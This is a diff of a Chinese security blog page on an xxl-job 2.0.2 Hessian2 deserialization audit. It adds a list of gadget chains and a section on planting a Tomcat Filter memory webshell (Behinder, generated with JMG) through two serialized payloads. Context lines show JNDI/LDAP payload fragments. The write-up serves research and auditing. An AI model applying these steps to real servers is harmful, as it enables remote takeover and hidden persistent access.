@@ -406,21 +406,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-03
+                    2025-03-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    16k
+                    16.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    68 分
+                    70 分
                 </div>
                 
 
@@ -1537,6 +1537,7 @@ JndiTemplate 通过LDAP协议连接到攻击者控制的服务器（ldap://127.0
 <p>最终this.lookup(name)时触发恶意代码的执行。</p>
 <h1 id="七、Hessian2反序列化漏洞gadget利用链编写"><a href="#七、Hessian2反序列化漏洞gadget利用链编写" class="headerlink" title="七、Hessian2反序列化漏洞gadget利用链编写"></a>七、Hessian2反序列化漏洞gadget利用链编写</h1><p>xxl-job 2.0.2 使用的Hessian2的版本是4.0.60，所以后面编写利用链的时候用的也是这个版本。</p>
 <p>编写利用链其实首先要猜测目标服务用了什么框架，什么依赖，（比如CC、Hessian、Dubble等），这些依赖内在的合法方法可以被用来构造恶意的利用链，所有能用什么链取决于目标有什么链可用。</p>
+<p>目前所知的可用的链有：ROME、AbstractBeanFactoryPointcutAdvisor 、xalan、</p>
 <h2 id="7-1-重写HashMap的put方法导致执行恶意代码的基本情形"><a href="#7-1-重写HashMap的put方法导致执行恶意代码的基本情形" class="headerlink" title="7.1 重写HashMap的put方法导致执行恶意代码的基本情形"></a>7.1 重写HashMap的put方法导致执行恶意代码的基本情形</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Hessian2Output</span></span><span class="token punctuation">;</span>
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Hessian2Input</span></span><span class="token punctuation">;</span>
 
@@ -1666,7 +1667,7 @@ resourceTypesloggerjndiTemplatebTqjava.util.HashSetldap://127.0.0.1:1389/eqe
 </ul>
 <p>4、使用建议</p>
 <ol>
-<li><strong>避免直接使用 <code>JdbcRowSetImpl</code></strong><br>  在业务代码中优先使用标准接口（如 <code>Connection</code> + <code>Statement</code>），而非 <code>RowSet</code> 的具体实现类。</li>
+<li><strong>避免直接使用 <code>JdbcRowSetImpl</code></strong><br> 在业务代码中优先使用标准接口（如 <code>Connection</code> + <code>Statement</code>），而非 <code>RowSet</code> 的具体实现类。</li>
 <li>防御反序列化攻击</li>
 </ol>
 <ul>
@@ -1675,7 +1676,7 @@ resourceTypesloggerjndiTemplatebTqjava.util.HashSetldap://127.0.0.1:1389/eqe
 <li>使用安全组件（如 Apache Shiro 的 <code>SerializationValidator</code>）。</li>
 </ul>
 <ol start="3">
-<li><strong>代码审计关键点</strong><br>  在安全审计中，需重点检查是否存在 <code>JdbcRowSetImpl</code> 的实例化操作，尤其是 <code>setDataSourceName()</code> 的参数是否可控。（通常是通过反序列化控制）</li>
+<li><strong>代码审计关键点</strong><br> 在安全审计中，需重点检查是否存在 <code>JdbcRowSetImpl</code> 的实例化操作，尤其是 <code>setDataSourceName()</code> 的参数是否可控。（通常是通过反序列化控制）</li>
 </ol>
 <p>5、示例漏洞场景（Hessian 反序列化）</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&gt;</span><span class="token comment">// 攻击者构造的恶意序列化数据</span>
@@ -2227,26 +2228,27 @@ charStreammap	listenersparamscNNldap://127.0.0.1:1389/gz7vpo��F����
 --------------------
 反序列化后的值<span class="token punctuation">{</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>, com.sun.syndication.feed.impl.EqualsBean@1181e00b<span class="token operator">=</span>com.sun.syndication.feed.impl.EqualsBean@1181e00b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="7-3-AbstractBeanFactoryPointcutAdvisor-链"><a href="#7-3-AbstractBeanFactoryPointcutAdvisor-链" class="headerlink" title="7.3 AbstractBeanFactoryPointcutAdvisor 链"></a>7.3 AbstractBeanFactoryPointcutAdvisor 链</h2><p>就是最开始复现此漏洞使用的链。</p>
+<h1 id="八、内存马"><a href="#八、内存马" class="headerlink" title="八、内存马"></a>八、内存马</h1><p>Xxl-job整体是基于springboot服务的，所以打内存马的话，我们只需要挑选一个Tomcat的Filter内存马即可，这里有2个问题。</p>
+<ul>
+<li>第一个就是为什么不打springboot内存马</li>
+</ul>
+<p>这是因为Springboot的interceptor本质上就是Filter，但是从优先级来看Filter是更高的，而在xxl-job实际上是有几个默认的interceptor的，所以优先级不够。</p>
+<ul>
+<li>为什么只能是Filter内存马</li>
+</ul>
+<p>鉴于上面说的默认interceptor，xxl-job内置有登录鉴权的interceptor，所以注入controller型的内存马，会因为优先级的问题而失效<br>那么我们最终就选择使用JMG工具生成一个冰蝎的Tomcat Filter内存马，JMG这款工具生成的内存马兼容性很强，比较推荐使用：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/02/24/dai-ma-shen-ji/xxl-job-dai-ma-shen-ji/%E6%88%AA%E5%B1%8F2025-03-05%2017.47.24.png" style="zoom:50%;">
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p>这样我们就得到了内存马的base64字节码了。我们怎么进行测试呢，github有maven项目源码，我们在help路由处对这个字节码进行加载。</p>
+<h4 id="打法"><a href="#打法" class="headerlink" title="打法"></a>打法</h4><ul>
+<li><p>先写入xlst文件-hessian1.ser</p>
+</li>
+<li><p>再注入内存马-hessian2.ser</p>
+</li>
+<li><p>然后冰蝎连接。</p>
+</li>
+</ul>
 <h1 id="讨论研究"><a href="#讨论研究" class="headerlink" title="讨论研究"></a>讨论研究</h1><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/02/24/dai-ma-shen-ji/xxl-job-dai-ma-shen-ji/image-20250228210816186.png" style="zoom:50%;">
 
 <p>核心难点：</p>
@@ -2256,6 +2258,7 @@ charStreammap	listenersparamscNNldap://127.0.0.1:1389/gz7vpo��F����
 <li>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LiangYueSec/article/details/142753382?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-5-142753382-blog-127436977.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;spm=1001.2101.3001.4242.4&amp;utm_relevant_index=8">https://blog.csdn.net/LiangYueSec/article/details/142753382?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-5-142753382-blog-127436977.235^v43^pc_blog_bottom_relevance_base4&amp;spm=1001.2101.3001.4242.4&amp;utm_relevant_index=8</a></li>
 <li>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44112065/article/details/127436977">https://blog.csdn.net/weixin_44112065/article/details/127436977</a></li>
 <li><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></li>
+<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2592">https://forum.butian.net/share/2592</a></li>
 </ul>
 
                 
@@ -2657,7 +2660,7 @@ charStreammap	listenersparamscNNldap://127.0.0.1:1389/gz7vpo��F����
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">288.7k</span>
+                        class="white-color">306.1k</span>
             
             
             
